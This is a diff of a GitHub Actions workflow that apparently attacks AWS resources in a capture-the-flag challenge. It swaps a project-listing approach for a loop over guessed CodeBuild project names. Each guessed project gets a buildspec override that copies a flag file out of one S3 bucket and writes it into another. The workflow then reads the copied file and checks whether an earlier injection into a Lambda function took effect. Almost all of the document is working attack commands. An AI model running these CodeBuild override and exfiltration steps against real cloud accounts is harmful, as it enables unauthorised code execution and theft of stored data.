@@ -19,33 +19,26 @@ jobs:
       - name: AWS identity
         run: aws sts get-caller-identity
 
-      - name: List and inspect CodeBuild projects
+      - name: Try start CodeBuild with guessed project names
         run: |
-          echo "===== list projects ====="
-          aws codebuild list-projects --region us-east-1 || echo "denied"
-          echo "===== batch get projects ====="
-          PROJECTS=$(aws codebuild list-projects --region us-east-1 --query 'projects' --output text 2>/dev/null)
-          if [ -n "$PROJECTS" ]; then
-            aws codebuild batch-get-projects --names $PROJECTS --region us-east-1
-          fi
-
-      - name: Start CodeBuild with overridden commands to read flag
-        run: |
-          PROJECT=$(aws codebuild list-projects --region us-east-1 --query 'projects[0]' --output text 2>/dev/null)
-          echo "Project: $PROJECT"
-          if [ -n "$PROJECT" ] && [ "$PROJECT" != "None" ]; then
-            BUILD_ID=$(aws codebuild start-build \
+          for PROJECT in codebuild_vpc nslookupv2 cicd deploy ctf attack; do
+            echo "===== trying project: $PROJECT ====="
+            aws codebuild start-build \
               --project-name "$PROJECT" \
               --region us-east-1 \
-              --buildspec-override '{"version":"0.2","phases":{"build":{"commands":["aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt","cat /tmp/flag.txt","aws s3 cp /tmp/flag.txt s3://platform-bucket-009661764077-us-east-1/flag_out.txt"]}}}' \
-              --query 'build.id' --output text)
-            echo "Build ID: $BUILD_ID"
-            sleep 30
-            echo "===== build status ====="
-            aws codebuild batch-get-builds --ids "$BUILD_ID" \
-              --query 'builds[0].{Status:buildStatus,Logs:logs}' --region us-east-1
-          fi
+              --buildspec-override '{"version":"0.2","phases":{"build":{"commands":["aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt && cat /tmp/flag.txt && aws s3 cp /tmp/flag.txt s3://platform-bucket-009661764077-us-east-1/flag_out.txt"]}}}' \
+              --query 'build.id' --output text 2>&1 || true
+          done
 
-      - name: Read flag from platform bucket if CodeBuild wrote it
+      - name: Wait for build
+        run: sleep 45
+
+      - name: Read flag from platform bucket
         run: |
           aws s3 cp s3://platform-bucket-009661764077-us-east-1/flag_out.txt - || echo "not found"
+
+      - name: Also check Lambda description - did previous injection work?
+        run: |
+          aws lambda get-function-configuration \
+            --function-name nslookupv2 --region us-east-1 \
+            --query '{Description: Description, Environment: Environment}'
